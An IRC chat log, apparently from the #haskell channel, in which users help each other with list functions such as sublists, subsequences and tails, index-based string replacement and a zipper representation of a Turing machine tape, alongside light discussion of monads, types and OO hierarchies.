08:43:25 <Siod> i speaking conceptually
08:43:26 <dmwit> Siod: What is the difference between a duck? The question is not meaningful, and there's no good explanation of why that could help repair it.
08:43:31 <Siod> e.g., supervenience
08:43:34 <matthiasgorgens> Siod: yes, they are the wrong concept.
08:43:47 <jmcarthur> Siod: what would a OO class hierarchy of me look like?
08:44:04 <matthiasgorgens> Siod: have you gone ahead and played around with call/cc in scheme?
08:44:05 <Siod> animal->human->man->jmcarthur
08:44:12 <absence> dmwit: is there some tool that can display some statistics or something on that?
08:44:31 <dmwit> absence: That depends. What kind of statistics are you looking for?
08:44:32 <matthiasgorgens> Siod: what does "->" mean?
08:44:34 <Siod> no, i don't know scheme matthiasgorgens
08:44:59 <jmcarthur> Siod: programming concept -> continuations
08:45:00 <Siod> matthiasgorgens: animal is the most generalized form of what jmcarthur is
08:45:07 <matthiasgorgens> Siod: also, your "animal->human->man->jmcarthur" seems to imply a prototype based approach (see javascript or smalltalk) not really classes..
08:45:11 <parcs`> absence: it's lots of bloat due to separate compilation and lack of whole-program optimization and stuff, i think
08:45:16 <Siod> matthiasgorgens: human is a more specific form that is subvenient of animal
08:45:20 <matthiasgorgens> siod, isn't object the most generalised form? ;o)
08:45:30 <parcs`> you can reduce the size by a factor of 7 or so with upx
08:45:32 <Siod> matthiasgorgens: not when we're speaking conceptually
08:45:34 <absence> dmwit: which libs are linked, their size, etc
08:45:58 <matthiasgorgens> siod, as a exercise can you give a class hierarchy for sets and bags (a bag is like a set, but can have multiple copies of an object, instead of just one or none.)
08:46:00 <dmwit> absence: You can find out which libraries are linked by cabalizing your program. You can find out the size of the libraries by inspecting them with "ls".
08:46:01 <Siod> actually, you're right, but for the sake of brevity
08:46:08 <jmcarthur> matthiasgorgens: tricky
08:46:15 <absence> parcs`: oh, i see
08:46:58 <dmwit> absence: ghc-pkg describe will tell you where to find the .a files.
08:47:20 <jmcarthur> Siod: i think this idea that everything fits nice and neat into a hierarchy to be pretty toxic and useless. it's basically just a great way to make it hard to understand things
08:47:30 <matthiasgorgens> siod, it might be useful for you to go and play around with continuation somewhat (be it in Haskell or Scheme or whatever) to inform your intuition.
08:47:41 <matthiasgorgens> jmcarthur: a great example are monads, actually.
08:47:58 <Siod> matthiasgorgens: i think you could create a hierachy of that
08:47:59 <matthiasgorgens> jmcarthur: you can see Applicative Functors as a `superclass' of Monads, or Arrows.
08:48:08 <dmwit> Hm, although the size of the .a file doesn't seem quite as relevant as I naively thought it would be.
08:48:13 <Siod> matthiasgorgens: you'd have to start from what we intersubjectively mean by groups
08:48:15 <matthiasgorgens> both of them are more general than monads, but extent the concept in different ways.
08:48:18 <jmcarthur> matthiasgorgens: yes, there is a heirarchy in *that* case
08:48:35 <jmcarthur> a sort of hierarchy
08:48:43 <matthiasgorgens> jmcarthur: perhaps if you invert it?
08:48:57 <jmcarthur> yeah, the dual is a hierarchy
08:49:05 <matthiasgorgens> jmcarthur: not if you include functors.
08:49:24 <matthiasgorgens> Functor -> Applicative Functor -> Monad
08:49:24 <matthiasgorgens> Functor -> Arrow -> Monad
08:49:25 <matthiasgorgens> (or?)
08:50:09 <jmcarthur> the so-called diamond dependency problem
08:50:14 <Siod> jmcarthur: i'm not convinced it is toxic to think that way
08:50:18 <jmcarthur> proof that hierarchies don't always exist ;)
08:50:35 <mparodi_> in order to get a list of all the sublist of a list I defined: sublist [] = [[]]; sublist (y:ys) = concat [ [(y:s),  s] | s <- sublist ys ]
08:50:42 <mparodi_> but it doesn't seem that natural...
08:50:45 <Siod> jmcarthur: what you're tying to explain to me, is that it's a category mistake to think of continuations in any kind of hierachal conceptual form
08:50:54 <mparodi_> any suggestion? I bet there's a better way
08:50:56 <Siod> jmcarthur: but you yourself said programming concepts -> continuations
08:51:08 <matthiasgorgens> mparodi_: yes. ;o)
08:51:14 <mparodi_> (I have to do so using list comprehension)
08:51:17 <matthiasgorgens> mparodi_: perhaps try the List-Monad?
08:51:27 <matthiasgorgens> mparodi_: part of your homework?
08:51:36 <Siod> jmcarthur: and i bet you can get the heirachy more granular than that
08:51:39 <jmcarthur> Siod: that was meant to be silly
08:51:46 <mparodi_> no, it's an exercise in the book I'm reading, matthiasgorgens
08:51:48 <Siod> jmcarthur: but it's correct, is in't?
08:51:54 <jmcarthur> Siod: probably not
08:52:03 <matthiasgorgens> jmcarthur: write a quick-check test for it.
08:52:04 <Siod> jmcarthur: how so?
08:52:07 <jmcarthur> Siod: continuations probably extend to various parts of math and such
08:52:29 <matthiasgorgens> jmcarthur: sure.  but you asked about oo hierarchy.
08:52:33 <mparodi_> matthiasgorgens, any suggestion? it does what I want but it's somehow complicated to understand why
08:52:50 <matthiasgorgens> mparodi_: is your code supposed to detect duplicates?
08:52:54 <mparodi_> no
08:52:57 <matthiasgorgens> > sublist "aa"
08:52:57 <matthiasgorgens> ["aa","a","a",""]
08:52:58 <lambdabot>   Not in scope: `sublist'
08:53:10 <matthiasgorgens> > let sublist [] = [[]]; sublist (y:ys) = concat [ [(y:s),  s] | s <- sublist ys ]
08:53:10 <absence> dmwit: ah, there's a libHSbase that's pretty huge :) if i add it with the sizes of the other .a files i use, i end up with the size of the executable before stripping
08:53:11 <lambdabot>   not an expression: `let sublist [] = [[]]; sublist (y:ys) = concat [ [(y:s)...
08:53:20 <mparodi_> > sublist [] = [[]]; sublist (y:ys) = concat [ [(y:s),  s] in sublist "aa"
08:53:21 <lambdabot>   <no location info>: parse error on input `='
08:53:25 <mparodi_> ¬¬
08:53:37 <matthiasgorgens> oh, the ; is probably worrying the lambdabot?
08:53:57 <mparodi_> I don't know
08:54:08 <jmcarthur> matthiasgorgens: i am not under any impression that we actually disagree on any particular point, so i'm confused
08:54:30 <matthiasgorgens> jmcarthur: I didn't think we disagree.
08:54:49 <matthiasgorgens> shoe-horning continuation into an OO hierarchy is not meaningful.
08:54:53 <matthiasgorgens> +s.
08:55:09 <mparodi_> > sublist t = case t of [] -> [[]] (y:ys) -> concat [ [(y:s),  s] in sublist "aa"
08:55:10 <lambdabot>   <no location info>: parse error on input `='
08:55:14 <mparodi_> >_>
08:55:24 <matthiasgorgens> mparodi_: have you tried foldr?
08:55:27 <dmwit> > let sublist [] = [[]]; sublist (y:ys) = concat [ [(y:s), s] | s <- sublist ys ] in sublist "aa"
08:55:28 <lambdabot>   ["aa","a","a",""]
08:55:40 <dmwit> mparodi_: concat applied to a list comprehension can always be eliminated. =)
08:56:00 <mparodi_> one second. why did it work now?
08:56:06 <dmwit> > let sublist [] = [[]]; sublist (y:ys) = [ v | s <- sublist ys, v <- [y:s, s] ] in sublist "aa"
08:56:07 <lambdabot>   ["aa","a","a",""]
08:56:15 <mparodi_> <matthiasgorgens> > let sublist [] = [[]]; sublist (y:ys) = concat [ [(y:s),  s] | s <- sublist ys ]
08:56:21 <mparodi_> it didn't ^
08:56:24 <dmwit> mparodi_: because let needs an in
08:56:26 <matthiasgorgens> mparodi_: let sub = foldr (\y sb -> concat [[(y:s),  s] | s <- sb]) []
08:56:29 <mparodi_> ah, I see
08:56:32 <matthiasgorgens> looks slightly more natural.
08:56:44 * hackagebot stylish-haskell 0.1.0.0 - Haskell code prettifier  http://hackage.haskell.org/package/stylish-haskell-0.1.0.0 (JasperVanDerJeugt)
08:56:47 <jmcarthur> @tell Siod http://www.shirky.com/writings/ontology_overrated.html
08:56:48 <lambdabot> Consider it noted.
08:57:21 <dmwit> > let sublist ys = [y:rest | y:ys <- tails ys, rest <- sublist ys] in sublist "abc"
08:57:22 <lambdabot>   []
08:57:44 <dmwit> eh
08:58:19 <dmwit> Okay, that's clearly wrong, and also I'm a bit surprised it even terminated.
08:58:32 <mparodi_> :P
08:59:07 <mparodi_> then my solution wasn't that bad, I thought you could do one far better than mine
08:59:34 <dmwit> > subsequences "abc"
08:59:36 <lambdabot>   ["","a","b","ab","c","ac","bc","abc"]
08:59:48 <matthiasgorgens> mparodi_: I could probably, but I wouldn't use a list comprehension.
08:59:53 <mparodi_> haha, but using list comprehension, of course
09:00:09 <mparodi_> @src subsequences
09:00:10 <lambdabot> Source not found. You speak an infinite deal of nothing
09:00:20 <matthiasgorgens> mparodi_: look on hoogle.
09:00:21 <dmwit> subsequences xs = [] : nonEmptySubsequences xs
09:00:54 <mparodi_> @src nonEmptySubsequences
09:00:55 <lambdabot> Source not found. Have you considered trying to match wits with a rutabaga?
09:00:58 <dmwit> > let sublist ys = [] : [y:rest | y:ys <- tails ys, rest <- sublist ys] in sublist "abc"
09:01:00 <lambdabot>   ["","a","ab","abc","ac","b","bc","c"]
09:01:04 <dmwit> There we go!
09:02:25 <mparodi_> I didn't know the function "tails" >_>
09:03:32 <mparodi_> I'm not quite sure why it works
09:03:45 <mparodi_> > tails [1,2,3]
09:03:46 <lambdabot>   [[1,2,3],[2,3],[3],[]]
09:04:19 <mparodi_> ah, sure!
09:04:40 <mparodi_> it's not intuitive
09:05:28 <dmwit> http://hackage.haskell.org/packages/archive/base/latest/doc/html/src/Data-List.html#subsequences for the library's definition of subsequences
09:05:41 <matthiasgorgens> there's also inits.
09:05:50 <matthiasgorgens> by the way, tails works in linear time and space.
09:05:52 <matthiasgorgens> thanks to sharing.
09:05:57 <matthiasgorgens> inits doesn't and can't.
09:06:11 <matthiasgorgens> > inits [1,2,3]
09:06:12 <lambdabot>   [[],[1],[1,2],[1,2,3]]
09:06:14 <dmwit> I'm not entirely sure why subsequences is defined the way it is rather than, e.g., the way I did above.
09:06:24 <matthiasgorgens> dmwit: could be fasther that way.
09:06:39 <mparodi_> linear time and space?
09:06:40 <matthiasgorgens> lots of stuff in the standard libraries has strange implementations.
09:06:46 <dmwit> List comprehensions get special treatment by the compiler.
09:06:57 <matthiasgorgens> http://hackage.haskell.org/packages/archive/base/latest/doc/html/src/Data-List.html#tails
09:07:00 <c_wraith> I think the strangest implementation goes to permutations
09:07:18 <matthiasgorgens> c_wraith: why?
09:07:30 <c_wraith> matthiasgorgens: have you looked at it?
09:07:36 <matthiasgorgens> c_wraith: yes, just now.
09:07:41 <dmwit> matthiasgorgens: That's not strange, it's a laziness optimization.
09:07:52 <dmwit> It's lazier than writing two clauses, one each for [] and (:).
09:08:09 <c_wraith> It's the fastest permutations implementation they could find that also works for infinite inputs.
09:08:15 <d-snp> declaring types is premature optimization!
09:08:39 <matthiasgorgens> d-snp: it's actually good for debugging.
09:08:41 <d-snp> there, I said it.. it had to be said.. someone had to say it..
09:08:41 <c_wraith> Which leads to tons of code and bizarre output ordering compared to more obvious implementations.
09:09:20 <d-snp> you think so? I think tests are good for debugging
09:09:34 <matthiasgorgens> d-snp: tests are also good for debugging.
09:10:12 <d-snp> mmh :P
09:10:21 <dmwit> Seems this implementation of subsequences is also a laziness optimization.
09:10:37 <matthiasgorgens> type driven programming (like test driven programming) works pretty well in haskell: You start by writing down the type, and then fumble around until you have an implementation that the compiler typechecks.
09:11:02 <matthiasgorgens> if you start with types and quickcheck, you can pretty much program by brownian motion.
09:11:40 <d-snp> but what if you write the types, and then the implementation, and then decide that the types are not good enough
09:12:08 <d-snp> hmm
09:12:23 <d-snp> nvm I'm not sure I'm making sense
09:12:40 <d-snp> I just still like ruby better than haskell, and it's making me feel insecure
09:13:12 <matthiasgorgens> d-snp: you change the types. :o)
09:13:24 <d-snp> yes and then your implementations break.. maybe
09:13:27 <dmwit> problem: types are insufficient
09:13:27 <luite> i sometimes have the same feeling (not with ruby though, i don't knwo ruby very well)
09:13:29 <dmwit> solution: more types
09:13:32 <matthiasgorgens> d-snp: you don't always have to write the types first.  It just works well for most of the time.
09:13:47 <matthiasgorgens> dmwit: exactly!
09:13:49 <dmwit> This is the Agda creed.
09:14:26 <matthiasgorgens> on a more pragmatic note, types help you encode some of your intentions in a form verifiable by the compiler
09:14:48 <matthiasgorgens> and when you make changes, you can often let the compiler trace all the places that you have to change, too.
09:15:05 <matthiasgorgens> (if we had more capable editing tools, some of those changes could be automated, too.)
09:15:58 <matthiasgorgens> completeness checks in case-statements are one example.  Suppose you add another option to a algebraic data type,
09:16:12 <matthiasgorgens> and want to make sure that all uses of the type take that new possibility into account.
09:17:07 <matthiasgorgens> (is that thing called completeness checking?  Or was the name different?  It's a bigger deal in the OCaml community than in Haskell-land.)
09:19:02 <rhapsodh1> http://hpaste.org/69150 is there any way i could make this shorter and more straightforward?
09:19:40 <dmwit> import Data.List.Split
09:19:41 <rhapsodh1> i would like to know how i could represent the algorithm better
09:19:42 <dmwit> ?hackage split
09:19:43 <lambdabot> http://hackage.haskell.org/package/split
09:19:46 <dmwit> ;-)
09:20:03 <rhapsodh1> :)
09:21:48 <dmwit> break (not . pred) = span pred
09:21:51 <Cale> That function is kinda weird
09:22:00 <Cale> ghci> splitWith (not . isSpace) "here are some words"
09:22:00 <Cale> ["here","are","some"]
09:22:12 <tgeeky> split should be in lambdabot :o
09:22:44 <tgeeky> Cale: wait, what? that is weird
09:23:00 <d-snp> would you allow me another heresy? I have a feeling callbacks style is better than IO monads..
09:23:15 <tgeeky> d-snp: no, feelings don't count
09:23:29 <d-snp> they don't? :P
09:23:47 <Cale> d-snp: There's only one IO monad.
09:23:59 <Cale> and what do you mean by "callbacks style"?
09:24:25 <jmcarthur> d-snp: from a point of view, the IO monad *is* callback style
09:24:41 <Cale> Many libraries, for example, Gtk2Hs have callbacks which can be set to particular IO actions.
09:25:08 <d-snp> well like in javascript, the style in which IO functions always immediately return and you supply a function that is called when the i/o is done
09:25:46 <c_wraith> d-snp: why do you think that's not what IO does?
09:26:11 <c_wraith> d-snp: there's a reason we like to laugh at node.js. the GHC IO manager does the same thing internally without mangling your code.
09:26:18 <zezikaro> How would you replace a specific char in a string?
09:26:25 <d-snp> it's not about wether IO does that, it's about wether you can eliminate the IO monad from your type declarations
09:26:26 <jmcarthur> c_wraith: i think implicit is that calling an IO function goes ahead and arranges for the side effects to happen even without binding up to main
09:26:30 <zezikaro> "foo"[0] = "b"
09:26:36 <zezikaro> -> boo
09:26:40 <zezikaro> how is that in haskell?
09:27:20 <Cale> zezikaro: Usually using splitAt to split the string at that point and then replace the character. It's not a common operation to want to do.
09:27:20 <c_wraith> d-snp: of course you can't.  the reason for an IO type is that you can't hide IO.  If you could eliminate the IO type, you'd be hiding IO.
09:27:32 <mzero> d-snp: I think that's silly: removing IO from a return type -vs- nested continuation passing? no contest!
09:27:34 <tgeeky> > "b" ++ tail "foo"
09:27:36 <lambdabot>   "boo"
09:28:00 <zezikaro> tgeeky it's a specific char i'm after
09:28:09 <zezikaro> index specifically
09:28:11 <matthiasgorgens> zezikaro: specific position or specific character?
09:28:14 <matthiasgorgens> ok.
09:28:20 <d-snp> mzero: why is that no contest? I think it's pretty
09:28:22 <matthiasgorgens> zezikaro: with take and drop.
09:28:25 <tgeeky> zezikaro:
09:28:28 <tgeeky> > rep1 "foo"
09:28:29 <lambdabot>   "boo"
09:28:35 <tgeeky> @src rep1
09:28:36 <lambdabot> Source not found. This mission is too important for me to allow you to jeopardize it.
09:28:41 <Cale> > let (xs,y:ys) = splitAt 7 "hello, world" in xs ++ 'm':ys
09:28:43 <lambdabot>  Terminated
09:28:45 <matthiasgorgens> d-snp: you might be interested in functional reactive programming.
09:28:48 <Cale> > let (xs,y:ys) = splitAt 7 "hello, world" in xs ++ 'm':ys
09:28:50 <zezikaro> matthiasgorgens char yeah
09:28:50 <lambdabot>   "hello, morld"
09:28:54 <zezikaro> i mean sorry
09:28:55 <zezikaro> index
09:29:03 <zezikaro> is there no 'insert'
09:29:16 <d-snp> matthiasgorgens: functional reactive programming is more like stream based I/O isn't it?
09:29:30 <d-snp> I am interested in functional reactive programming
09:29:30 <jmcarthur> not really
09:29:33 <matthiasgorgens> zezikaro: strings are immutable.
09:29:40 <zezikaro> in haskell?
09:29:50 <matthiasgorgens> zezikaro: almost everything is immutable in haskell.
09:30:01 <matthiasgorgens> zezikaro: or what do you mean by `insert'?
09:30:04 <dmwit> > insert 5 $ [1..3] ++ [10..30]
09:30:06 <lambdabot>   [1,2,3,5,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30]
09:30:23 <dmwit> Sure, there's insert! =)
09:30:28 <matthiasgorgens> dmwit: yes.
09:30:29 <tgeeky> we will never forget you, [4,6,7,8,9]!
09:30:34 <matthiasgorgens> just doesn't do what he wants.
09:30:39 <tgeeky> hey, that's the code on my luggage
09:30:47 <dmwit> He didn't say what he wants, so I can hardly be blamed for that.
09:30:52 <tgeeky> dmwit: hehe :)
09:31:24 <matthiasgorgens> zezikaro: so you want a function of type: replace :: Int -> Char -> [Char] -> [Char] ?
09:31:54 <tgeeky> matthiasgorgens: probably more useful for :: Integral -> [Char] -> [Char] -> [Char]
09:32:11 <Cale> > let replace n c xs = ys ++ c:zs where (ys,z:zs) = splitAt n xs in replace 7 'm' "hello, world!"
09:32:13 <lambdabot>   "hello, morld!"
09:32:32 <Cale> The reason it's not in the standard library is that nobody ever wants to do that
09:32:46 <matthiasgorgens> zezikaro: why do you want to do that?
09:32:52 <tgeeky> Cale: I was going to say "never say never", but you somehow managed to avoid that trap.
09:33:00 <Cale> and if you're making index-based replacements a lot, you'd be using Data.Map or something.
09:33:09 <matthiasgorgens> cale, or even arrays.
09:35:33 <Cale> Lists are not for random access
09:35:45 <Cale> They're for sequential access only.
09:35:50 <hpc> pseudo-random access! :D
09:36:16 <zezikaro> http://ideone.com/SfNUc
09:36:18 <zezikaro> is that okay
09:36:22 <Cale> There are things like (!!), but if you're using them a bunch, you probably don't want lists.
09:36:44 <Cale> zezikaro: looks like it'll work
09:36:50 <slack1256> on the haskell-wiki performance/monad say that "mtl" doesn't inline well
09:37:16 <slack1256> is that still the case? our should i roll my own monads when performance is absolute neccesary
09:37:31 <slack1256> (not that i know how to roll my own monads)
09:37:35 <matthiasgorgens> zezikaro: you can use hpaste.
09:37:41 <Cale> slack1256: Yeah, if you really really care about performance, using monad transformers is still suboptimal, I think.
09:37:59 <Cale> slack1256: But that's not something that you'd want to do without profiling first.
09:38:07 <zezikaro> Is, http://ideone.com/B1yHx better?
09:38:13 <zezikaro> What's the preferred way of writing things out
09:38:13 <matthiasgorgens> zezikaro: should work, but cale had a working function a few minutes ago already.
09:38:26 <hpc> slack1256: honestly, you can also roll your own monad just to keep things easy to reason about, too
09:38:29 <Cale> replace n c xs = ys ++ c:zs where (ys,z:zs) = splitAt n xs
09:38:33 <Cale> ^^ that's how I'd write it
09:38:34 <hpc> large transformer stacks look ugly in error messages
09:38:36 <zezikaro> what is a monad?
09:38:46 <zezikaro> sorry i only started haskell like 2 days ago
09:38:50 <Cale> hpc: You can always wrap the thing in a newtype
09:39:01 <hpc> zezikaro: it's a thing you learn later
09:39:02 <Cale> zezikaro: It's a type constructor which supports a certain API
09:39:20 <zezikaro> I've given up looking at the book now >.<
09:39:20 <slack1256> hpc: where can i learn to roll them?
09:39:25 <matthiasgorgens> zezikaro: you'll find lots of tutorials about Monads online, and may even and up writing your own.
09:39:31 <slack1256> is there some tutorial
09:39:36 <slack1256> ok.
09:39:46 <zezikaro> I needed to replace a specific index for a turing machine
09:39:56 <hpc> slack1256: read the sources of the mtl transformers, is a good start
09:40:21 <Cale> zezikaro: That's going to be slow, by the way
09:40:27 <matthiasgorgens> slack1256: are you already able to write your own non-transformed monads?
09:40:35 <byorgey> zezikaro: if you only started haskell 2 days ago, I don't recommend trying to figure out monads just yet.  it's unnecessary, and will end up being a lot easier once you have mastered a lot of the more fundamental Haskell concepts first.
09:40:43 <matthiasgorgens> zezikaro: oh, you should modell you tape as two lists.
09:40:46 <dmwit> zezikaro: For a Turing machine, instead of storing a [Symbol] for the tape and Int for the head, store a [Symbol] for the tape to the left of the head, a Symbol under the head, and a [Symbol] for the tape to the right of the head.
09:40:55 <Cale> zezikaro: If you want to represent a Turing machine's tape and head, a better way is to use two lists
09:41:00 <Cale> one of which is reversed
09:41:08 <parcs`> what about cps-style monads vs 'transformers'-style monads wrt performance?
09:41:10 <dmwit> zezikaro: (This idea can be generalized somewhat, if you're interested: read a bit about zippers.)
09:41:19 <matthiasgorgens> zippers are fun.
09:41:21 <Cale> (and maybe an identified element)
09:41:28 <slack1256> matthiasgorgens: yeah. but the idea or roll you own monad is to make things as the RWS one. but i don't understand how to do IO with that
09:41:29 <matthiasgorgens> cale, that gives you co-monads.
09:41:39 <matthiasgorgens> slack1256: look into the MonadIO class.
09:41:46 <mzero> actually, zezikaro - I'd ignore the advice about tape representation
09:41:48 <mzero> for now -
09:42:02 <mzero> just get what you've got working - your idea is fine (if slow to execute)
09:42:16 <matthiasgorgens> left :: [a], current_element :: a, right :: [a] should work for the turing machine.
09:42:18 <mzero> later, you'll enjoy the process of refactoring the tape data structure
09:42:19 <solrize> rhapsodh1, http://hpaste.org/diff/69150/69155
09:42:32 <Cale> zezikaro: Like for example, if you had a tape with [1,2,3,4,5,6,7] written on it, and the Turing machine's head is positioned over the 4, you'd want ([3,2,1],4,[5,6,7])
09:42:35 <matthiasgorgens> mzero: the idea is prone to bugs.  (though should work (slowly) if you are careful.)
09:42:38 <mzero> and will learn a great deal about the power of Haskell: That refactoring is not just easy, it is fun!
09:42:58 <matthiasgorgens> mzero: point conceded. :o)
09:43:04 <zezikaro> So much advice >.<
09:43:15 <zezikaro> I don't know what to do now! haha
09:43:21 <zezikaro> okay, i'll continue on, and refactor
09:43:35 <zezikaro> I understand what you mean about the different rape head representatioin though
09:43:37 <zezikaro> thanks
09:43:40 <Cale> zezikaro: The reason for this other representation is that it's easy and cheap to move the head left and right.
09:43:44 <zezikaro> s/rape/tape/
09:44:09 <slack1256> matthiasgorgens: this is great. i didn't know this existed.
09:44:22 * slack1256 that feel when you get what you wanted just with a click
09:45:10 <Cale> moveRight (xs,y,z:zs) = (y:xs,z,zs)
09:45:27 <dmwit> Why is codepad in Slovenian?
09:45:33 <Cale> moveLeft (x:xs,y,zs) = (xs,x,y:zs)
09:46:06 <Cale> dmwit: uhhhh
09:46:11 <dmwit> I mean ideone.
09:46:27 <dmwit> "Opublikuj na Facebooku"
09:46:31 <Cale> wat
09:46:40 <Cale> I'm not seeing what you're seeing somehow.
09:47:00 <dmwit> I clicked zezikaro's ideone link, and it's all in Slovenian. O_o
09:47:22 <Cale> I did too, and mine is in English
09:47:31 <Cale> http://ideone.com/B1yHx right?
09:47:37 <mparodi_> @hoogle [a] -> [[a]]
09:47:38 <lambdabot> Data.List inits :: [a] -> [[a]]
09:47:38 <lambdabot> Data.List permutations :: [a] -> [[a]]
09:47:38 <lambdabot> Data.List subsequences :: [a] -> [[a]]
09:47:44 <dmwit> Cale: right
09:48:04 <Cale> oh, you can select a language at the bottom of the page
09:48:05 <rhapsodh1> english
09:48:10 <byorgey> Cale: look at the very bottom
09:48:14 <Cale> but Slovenian is not one of the choices.
09:48:16 * byorgey gets something other than English too
09:48:36 <mparodi_> @hoogle+
09:48:37 <lambdabot> Data.List tails :: [a] -> [[a]]
09:48:37 <lambdabot> GHC.Exts groupWith :: Ord b => (a -> b) -> [a] -> [[a]]
09:48:37 <lambdabot> Data.List groupBy :: (a -> a -> Bool) -> [a] -> [[a]]
09:48:40 <mparodi_> @hoogle+
09:48:40 <lambdabot> Test.QuickCheck.Arbitrary shrinkList :: (a -> [a]) -> [a] -> [[a]]
09:48:41 <lambdabot> Data.List group :: Eq a => [a] -> [[a]]
09:48:41 <lambdabot> Control.Applicative many :: Alternative f => f a -> f [a]
09:48:49 <dmwit> I mean, I don't know for sure that it's Slovenian. That's just what Google Translate suggests as the most likely language for the words it has.
09:49:12 * byorgey thinks it is probably Polish
09:49:16 <Cale> Though there is Polish
09:49:17 <Cale> yeah
09:49:18 <byorgey> because ideone is associated with SPOJ
09:49:31 <byorgey> which is made by Polish coders, I think
09:49:40 <mparodi_> any standard function to get sequences of a list? "abc" -> [], a, b, c, ab, bc, abc
09:49:56 <dmwit> > subsequences "abc"
09:49:57 <Cale> > subsequences "abc"
09:49:57 <lambdabot>   ["","a","b","ab","c","ac","bc","abc"]
09:49:58 <lambdabot>   ["","a","b","ab","c","ac","bc","abc"]
09:50:02 <mparodi_> it's not the same
09:50:05 <mparodi_> ac shouldn't be there
09:50:13 <dmwit> ah
09:50:24 <dmwit> > (inits >=> tails) "abc"
09:50:25 <byorgey> if you click through to http://sphere-research.com/, the address is in Poland
09:50:26 <lambdabot>   ["","a","","ab","b","","abc","bc","c",""]
09:50:37 <Cale> hmm
09:50:41 <mparodi_> (inits >=> tails) "abc" <-- what on Earth?
09:50:46 <dmwit> =)
09:51:08 <tromp_> :t >=>
09:51:09 <lambdabot> parse error on input `>=>'
09:51:18 <tromp_> :t (>=>)
09:51:19 <lambdabot> forall a (m :: * -> *) b c. (Monad m) => (a -> m b) -> (b -> m c) -> a -> m c
09:51:32 <byorgey> backwards Kleisli composition
09:51:42 <Cale> > ((tail . inits) <=< tails) "abc"
09:51:44 <lambdabot>   ["a","ab","abc","b","bc","c"]
09:51:58 <mparodi_> what should I do to use it?
09:51:58 <dmwit> Composition either way is fine.
09:52:05 <dmwit> > (inits <=< tails) "abc"
09:52:06 <lambdabot>   ["","a","ab","abc","","b","bc","","c",""]
09:52:06 <Cale> import Control.Monad
09:52:43 <dmwit> There's lots of empty lists because there's lots of ways to choose the empty list -- one in between each letter. =)
09:52:58 <mparodi_> it creates the empty list many times
09:53:09 <mparodi_> ah, I see
09:53:10 <mparodi_> ok
09:53:22 <Cale> you could also just do something like...
09:53:26 <mparodi_> > let sequences [] = [[]]; sequences (y:ys) = [ v | seq <- sequences ys, v <- seq : [ y:seq | (length ys == 0) || (length seq == 0) || (head ys == head seq) ]] in sequences "abc"
09:53:27 <lambdabot>   ["","a","b","ab","c","bc","abc"]
09:53:42 <mparodi_> any way to rewrite it?
09:53:58 <mparodi_> specially the condition (length ys == 0) || (length seq == 0) || (head ys == head seq) :P
09:54:08 <dmwit> yeah, really yuck
09:54:21 <Cale> length is bad
09:54:23 <zezikaro> is there a "first"
09:54:26 <zezikaro> so
09:54:33 <Cale> at least use null
09:54:35 <dmwit> At the very least use null instead of (length _ == 0).
09:54:36 <zezikaro> first (even) [1,2,3]
09:54:40 <zezikaro> > first (even) [1,2,3]
09:54:41 <lambdabot>   Couldn't match expected type `[t]' against inferred type `(b, d)'
09:54:47 <dmwit> > filter even [1,2,3]
09:54:48 <lambdabot>   [2]
09:54:53 <zezikaro> but that gives an array
09:54:54 <zezikaro> i want
09:54:56 <Cale> > find even [1,2,3]
09:54:57 <lambdabot>   Just 2
09:54:59 <zezikaro> [a] -> a
09:55:05 <dmwit> > head (filter even [1,2,3])
09:55:05 <zezikaro> thanks
09:55:06 <lambdabot>   2
09:55:09 <mparodi_> > [] == null
09:55:10 <dmwit> ?quote sprynge
09:55:10 <lambdabot>   Couldn't match expected type `[a]'
09:55:10 <lambdabot>         against inferred type `[a1] -> G...
09:55:10 <lambdabot> Cale says: Beware of the function [a] -> a. For it may contain trappes and sprynges of great variety and harm.
09:55:28 <mparodi_> how can I use null? I didn't get your suggestion
09:55:32 <Cale> :t null
09:55:33 <lambdabot> forall a. [a] -> Bool
09:55:36 <Cale> > null []
09:55:37 <lambdabot>   True
09:55:40 <Cale> > null [1..]
09:55:41 <dmwit> zezikaro: But keep in mind that it's almost always a premature optimization to use Maybe instead of [].
09:55:41 <lambdabot>   False
09:55:42 <mparodi_> ah, it's a function!
09:55:43 <mparodi_> lol
09:55:46 <zezikaro> "Just" o.O
09:55:47 <Cale> > [] == []
09:55:48 <lambdabot>   True
09:55:51 <Cale> > [1..] == []
09:55:53 <lambdabot>   False
09:56:02 <zezikaro> > Just 1
09:56:03 <lambdabot>   Just 1
09:56:04 <Cale> > length [] == 0
09:56:05 <zezikaro> wat
09:56:05 <lambdabot>   True
09:56:09 <Cale> > length [1..] == 0
09:56:13 <lambdabot>   mueval-core: Time limit exceeded
09:56:13 <Cale> ^^ bad
09:56:19 <dmwit> ?src Maybe
09:56:19 <lambdabot> data Maybe a = Nothing | Just a
09:56:24 <dmwit> zezikaro: That's where Just is defined.
09:56:34 <mparodi_> let sequences [] = [[]]; sequences (y:ys) = [ v | seq <- sequences ys, v <- seq : [ y:seq | (null ys) || (null seq) || (head ys == head seq) ]]
09:56:39 <dmwit> It's the type of lists of length at most one.
09:56:44 <zezikaro> This is all so confusing :|
09:56:51 * hackagebot stylish-haskell 0.1.1.0 - Haskell code prettifier  http://hackage.haskell.org/package/stylish-haskell-0.1.1.0 (JasperVanDerJeugt)
09:56:56 <mparodi_> any null [ys seq]
09:56:57 <Cale> heh
09:56:58 <mparodi_> should work as well
09:57:09 <dmwit> zezikaro: Why is it confusing? There isn't always an answer, so you can't just always return an answer.
09:57:12 <dmwit> So what do you do?
09:57:16 <mparodi_> > let sequences [] = [[]]; sequences (y:ys) = [ v | seq <- sequences ys, v <- seq : [ y:seq | (any null [ys seq]) || (head ys == head seq) ]] in sequences "abc"
09:57:17 <lambdabot>   Couldn't match expected type `[a] -> [a1]'
09:57:18 <lambdabot>         against inferred type `[...
09:57:21 <dmwit> You invent a type that can either answer or say there was no answer.
09:57:25 <mparodi_> > let sequences [] = [[]]; sequences (y:ys) = [ v | seq <- sequences ys, v <- seq : [ y:seq | (any null [ys, seq]) || (head ys == head seq) ]] in sequences "abc"
09:57:26 <lambdabot>   ["","a","b","ab","c","bc","abc"]
09:57:28 <dmwit> That is, either it's Just answer or Nothing.
09:57:29 <mparodi_> yay!
09:57:41 <mparodi_> it's still ugly
09:57:50 <dmwit> mparodi_: Now, what's this "head ys == head seq" constraint about?
09:58:20 <mparodi_> dmwit, you can add y:seq only if the first element of seq is the one that comes after y (head ys)
09:58:42 <mparodi_> otherwise "ac" will be a result, for example
09:58:56 <dmwit> mparodi_: That doesn't seem to work well with lists that have duplicates.
